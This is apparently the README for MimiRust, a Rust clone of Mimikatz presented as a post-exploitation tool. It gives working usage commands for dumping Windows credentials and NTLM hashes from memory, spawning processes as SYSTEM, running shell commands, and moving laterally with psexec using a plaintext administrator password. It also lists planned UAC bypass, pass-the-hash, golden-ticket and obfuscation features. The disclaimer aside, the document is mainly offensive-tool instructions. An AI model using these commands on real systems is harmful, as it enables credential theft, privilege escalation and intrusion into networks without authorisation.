# MimiRust - Hacking the Windows operating system to hand us the keys to the kingdom with Rust.

<br><h3>Disclaimer</h3>
<p>By changing, adding, using or spreading this codebase you solely accept responsibility. The original creator, by the monikor: ThottySploity, is not responsible for what you do with the information and code provided. This code is intended for professional or educational purposes only.</p>

<p>MimiRust was only created because I was bored, wanted to learn more about MimiKatz and I find these kinds of programs very interesting. I do not condone using this program outside of networks where you have no authorization.</p>

<br>

<code>

    ███▄ ▄███▓ ██▓ ███▄ ▄███▓ ██▓ ██▀███   █    ██   ██████ ▄▄▄█████▓
    ▓██▒▀█▀ ██▒▓██▒▓██▒▀█▀ ██▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒
    ▓██    ▓██░▒██▒▓██    ▓██░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░
    ▒██    ▒██ ░██░▒██    ▒██ ░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░
    ▒██▒   ░██▒░██░▒██▒   ░██▒░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒  ▒██▒ ░
    ░ ▒░   ░  ░░▓  ░ ▒░   ░  ░░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░
    ░  ░      ░ ▒ ░░  ░      ░ ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░
    ░      ░    ▒ ░░      ░    ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░    ░
           ░    ░         ░    ░     ░        ░           ░

                    written in Rust by ThottySploity
            mimiRust $ means it's running without elevated privileges
             mimiRust # means it's running with elevated privileges
              mimiRust @ means it's running with system privileges


    mimiRust @ ?

    Choose one of the following options:

      passwords:
              • dump-credentials             Dumps systems credentials through Wdigest.
              • dump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
              • clear                        Clears the screen of any past output.
              • exit                         Moves to top level menu

      pivioting:
              • shell <SHELL COMMAND>        Execute a shell command through cmd, returns output.
              • psexec                       Executes a service on another system.
              • clear                        Clears the screen of any past output.
              • exit                         Moves to top level menu
              • (W.I.P)pth                   Pass-the-Hash to run a command on another system.
              • (W.I.P)golden-ticket         Creates a golden ticket for a user account with the domain.

      privilege:
              • spawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location.
              • clear                        Clears the screen of any past output.
              • exit                         Moves to top level menu

    mimiRust @ passwords
    mimiRust::passwords @ dump-credentials

</code>
<p>MimiRust is a post-exploitation tool that can be used within redteam operations. MimiRust is a tool of all trades, it can spawn new processes, execute shell commands, extract Windows passwords and move laterally across a network. Like the name suggests the entire project is made within the Rust language. MimiRust is capable of the following tasks:</p>
<ul>
  <li>Spawning any process as SYSTEM</li>
  <li>Executing shell commands</li>
  <li>Extracting Windows passwords out of memory through the wdigest attack vector.</li>
  <li>Extracting Windows NTLM hashes from user accounts (aes / des) & (md5 / rc4)</li>
  <li>PSExec to create and start a service on another endpoint.</li>
</ul><br>
<p>Todo:</p>
<small>Not in chronological order.</small>
<ul>
  <li>Dumping SYSTEM, SAM and SECURITY hives to crack hashes locally.</li>
  <li>Scheduled task to create and start a service on another endpoint.</li>
  <li>Allow full encrypted communications over namedpipe.</li>
  <li>Bypass UAC and escalate automatically to SYSTEM.</li>
  <li>PtH (Pass-The-Hash).</li>
  <li>Kerberos Golden Ticket.</li>
  <li>LSA patch to get NTLM hashes from LSASS (Local Security Authority Subsystem Service).</li>
</ul>
<small><strong>Maybe in the future I will make API calls obfuscated and strings polymorphic</strong></small>

<h2>Quick usage:</h2>
<p>MimiRust can be ran in two different ways: from the command line using mimiRust.exe --help or in the shell by running the executable without any command line arguments. For help with the program type one of the following into mimiRust:</p>
<ul>
  <li><code>mimiRust # ?</code></li>
  <li><code>mimiRust # h</code></li>
  <li><code>mimiRust # help</code></li>
</ul>
<p>You will now be required to type in the module that you want to access, current modules are:</p>
<ul>
  <li><code>passwords</code></li>
  <li><code>pivioting</code></li>
  <li><code>privilege</code></li>
</ul>

<br><h3>Dumping credentials from memory through wdigest</h3>
<code>mimiRust::passwords # dump-credentials</code><br>
<code>mimiRust.exe --dump-credentials</code>
<br>

<br><h3>Dumping NTLM hashes from user accounts</h3>
<code>mimiRust::passwords @ dump-hashes</code><br>
<code>mimiRust.exe --dump-hashes</code>
<br>

<br><h3>Executing shell commands</h3>
<code>mimiRust::pivioting $ shell whoami</code>
<br>

<br><h3>Spawning a process with SYSTEM</h3>
<code>mimiRust::privilege # spawn-path cmd.exe</code><br>
<code>mimiRust.exe -s cmd.exe</code>

<br><h3>Lateral movement through the network</h3>
<code>psexec /computer:WIN-SJ39U8K8RBS /binary_path:\\WIN-GVVSP2K4NM6\C$\Users\Administrator\Downloads\write.exe /sn:MimiRust /user:THOTTYSPLOITY\Administrator /pass:Welcome01</code><br>
<code>shell sc \\WIN-SJ39U8K8RBS start MimiRust</code><br>

<h2>Demo</h2>
<small>click on the demo to get a higher resolution</small>
<img src="https://github.com/ThottySploity/mimiRust/blob/main/demo.gif" alt="mimiRust Demo" width="100%">
